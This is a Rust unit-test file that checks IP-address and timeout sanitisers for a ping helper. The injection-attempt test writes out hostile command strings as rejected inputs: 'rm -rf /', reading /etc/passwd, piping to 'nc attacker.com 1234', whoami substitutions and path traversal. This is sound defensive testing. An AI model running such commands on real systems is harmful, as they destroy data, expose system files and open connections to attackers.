#[cfg(test)]
mod tests {
    use crate::ScrapeError;

    use super::super::ping::{sanitize_ip, sanitize_timeout};

    #[test]
    fn test_sanitize_ip_valid() {
        assert_eq!(sanitize_ip("192.168.1.1").unwrap(), "192.168.1.1");
        assert_eq!(sanitize_ip("8.8.8.8").unwrap(), "8.8.8.8");
        assert_eq!(sanitize_ip("127.0.0.1").unwrap(), "127.0.0.1");
        assert_eq!(sanitize_ip("0.0.0.0").unwrap(), "0.0.0.0");
        assert_eq!(sanitize_ip("255.255.255.255").unwrap(), "255.255.255.255");
    }

    #[test]
    fn test_sanitize_ip_injection_attempts() {
        // Command injection attempts
        assert!(sanitize_ip("192.168.1.1; rm -rf /").is_err());
        assert!(sanitize_ip("192.168.1.1 && cat /etc/passwd").is_err());
        assert!(sanitize_ip("192.168.1.1|nc attacker.com 1234").is_err());
        assert!(sanitize_ip("192.168.1.1`whoami`").is_err());
        assert!(sanitize_ip("192.168.1.1$(whoami)").is_err());

        // Invalid characters
        assert!(sanitize_ip("192.168.1.1\n").is_err());
        assert!(sanitize_ip("192.168.1.1\r").is_err());
        assert!(sanitize_ip("192.168.1.1 ").is_err());
        assert!(sanitize_ip("192.168.1.1\t").is_err());
        assert!(sanitize_ip("192.168.1.1'").is_err());
        assert!(sanitize_ip("192.168.1.1\"").is_err());

        // Path traversal attempts
        assert!(sanitize_ip("../../etc/passwd").is_err());
        assert!(sanitize_ip("../../../").is_err());

        // Special characters
        assert!(sanitize_ip("192.168.1.1#comment").is_err());
        assert!(sanitize_ip("192.168.1.1/32").is_err());
        assert!(sanitize_ip("192.168.1.1:80").is_err());
    }

    #[test]
    fn test_sanitize_ip_empty_and_edge_cases() {
        assert!(sanitize_ip("").is_err());
        assert!(sanitize_ip("...").is_ok()); // Invalid IP but passes sanitization
        assert!(sanitize_ip("999.999.999.999").is_ok()); // Out of range but valid format
    }

    #[test]
    fn test_sanitize_timeout_valid() {
        assert_eq!(sanitize_timeout(1).unwrap(), "1");
        assert_eq!(sanitize_timeout(5).unwrap(), "5");
        assert_eq!(sanitize_timeout(30).unwrap(), "30");
        assert_eq!(sanitize_timeout(60).unwrap(), "60");
        assert_eq!(sanitize_timeout(300).unwrap(), "300");
        assert_eq!(sanitize_timeout(3600).unwrap(), "3600");
    }

    #[test]
    fn test_sanitize_timeout_invalid() {
        // Zero is invalid
        assert!(sanitize_timeout(0).is_err());

        // Too large (more than 1 hour)
        assert!(sanitize_timeout(3601).is_err());
        assert!(sanitize_timeout(10000).is_err());
        assert!(sanitize_timeout(u16::MAX).is_err());
    }

    #[test]
    fn test_sanitize_timeout_boundary_values() {
        // Minimum valid
        assert!(sanitize_timeout(1).is_ok());

        // Maximum valid
        assert!(sanitize_timeout(3600).is_ok());

        // Just outside boundaries
        assert!(sanitize_timeout(0).is_err());
        assert!(sanitize_timeout(3601).is_err());
    }

    #[test]
    fn test_error_messages() {
        match sanitize_ip("192.168.1.1; rm -rf /") {
            Err(ScrapeError::InvalidInput(msg)) => {
                assert!(msg.contains("Invalid IP address format"));
            }
            _ => panic!("Expected InvalidInput error"),
        }

        match sanitize_timeout(0) {
            Err(ScrapeError::InvalidInput(msg)) => {
                assert!(msg.contains("must be between 1 and 3600"));
            }
            _ => panic!("Expected InvalidInput error"),
        }
    }

    #[test]
    fn test_sanitize_returns_string() {
        let result = sanitize_ip("192.168.1.1").unwrap();
        assert_eq!(result.len(), 11);
        assert!(result.chars().all(|c| c.is_ascii_digit() || c == '.'));

        let timeout_result = sanitize_timeout(42).unwrap();
        assert_eq!(timeout_result, "42");
        assert!(timeout_result.chars().all(|c| c.is_ascii_digit()));
    }
}
